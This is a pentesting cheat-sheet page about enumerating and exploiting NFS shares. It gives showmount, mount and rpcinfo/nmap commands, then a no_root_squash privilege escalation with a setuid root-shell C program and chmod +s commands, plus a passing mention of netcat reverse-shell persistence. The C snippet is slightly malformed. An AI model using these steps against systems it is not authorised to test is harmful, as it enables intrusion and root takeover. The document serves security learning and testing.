# ⭕ NFS

## :ballot\_box\_with\_check: <mark style="color:blue;">Introduction</mark>

network File System (NFS) is a distributed file system protocol originally developed by Sun Microsystems in 1984. It allows a user on a client computer to access files over a computer network as if they were on locally-mounted storage. NFS is often used with UNIX operating systems and is predominantly insecure in its implementation. It can be somewhat difficult to set up securely, so it’s not uncommon to find NFS shares open to the world. This is quite convenient for us as penetration testers, as we might be able to leverage them to collect sensitive information, escalate our privileges, and so forth.

Both Portmapper and RPCbind run on TCP port 111. RPCbind maps RPC services to the ports on which they listen. RPC processes notify rpcbind when they start, registering the ports they are listening on and the RPC program numbers they expect to serve.

The client system then contacts rpcbind on the server with a particular RPC program number. The rpcbind service redirects the client to the proper port number (often TCP port 2049) so it can communicate with the requested service.

Please note that since NFS is an RPC-based service and relies on other RPC services, such as “mountd,” it should be directly queried via the Portmapper service which is found on port TCP and/or UDP 111 when using Nmap NSE scripts for instance.

An administrator wishing to share files from an NFS server will configure what are known as “exports.” Exports are the mechanism used by NFS in order to “export” directories, in other words, make entire directories available to other users over the network. Exports configured for any given NFS server can usually be found in the “/etc/exports” file on a target host locally. For now, we’re going to focus on identifying available exports from a remote perspective. One common issue with NFS, is that oftentimes administrators will configure exports with little attention to security, and will usually “export” directories in a manner that allows any host or IP address to connect, without any authentication, and if we’re lucky, also provide write-access to directories.

## <mark style="color:red;">find directories (shares)</mark>

```
showmount -e [ip]
```

after finding directories we can try to mount them to our system, for example lets say we found a directory shared with which is the home directory of user "bob":

```
mkdir -p /mnt/home/bob
mount -t nfs [NFS Server IP]:/home/bob /mnt/home/bob -o nolock
cd /mnt/home/bob && ls -al
```

if we find any directories we can mount the shared directory and access it:

```
mount -t nfs <NFS Server IP>:/home/bob /mnt/home/bob -o nolock
cd /mnt/home/bob && ls -al
```

## <mark style="color:red;">port map with rpcinfo</mark>

NFS can be identified by probing port 2049 directly or asking the portmapper for a list of services Portmapper (AKA rpcbind) is another common service found on Linux-based systems and is used to essentially “map” RPC (Open Network Computing Remote Procedure Call or “ONC RPC,” not to be confused with Microsoft’s implementation of RPC) services to their corresponding TCP or UDP ports on a target system.

{% hint style="info" %}
Querying a single port (TCP/111), essentially enumerates all related RPC-related service ports without us having to conduct a port scan against all those ports individually.
{% endhint %}

```
nmap --script rpc-grind,rpcinfo 192.168.13.26 –p 111
rpcinfo -p [ip]
```

#### we can use a “xinetd” RPC-based UDP service combined with a netcat reverse shell, and a “port knocking” method for persistence on a host once we have access.

there are possible privilege escalation methods if NFS service is available to us, refer to [this section](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/untitled/privilege-escalation/nfs) under linux privilege escalation.

## <mark style="color:red;">NFS Exported Shares</mark>

List NFS exported shares:

```
showmount -e 192.168.110.102
```

and check if 'rw,no\_root\_squash' is present. If it is present, compile the below sid-shell.c:

```c
#include <unistd.h>

main( int argc, char ** argv, char ** envp )
{
    setgid(0); setuid(0); system("/bin/bash", argv, envp);
    return 0;
}
```

upload it to the share and execute the below to launch sid-shell to spawn a root shell:

```
chown root:root sid-shell; chmod +s sid-shell; ./sid-shell
```
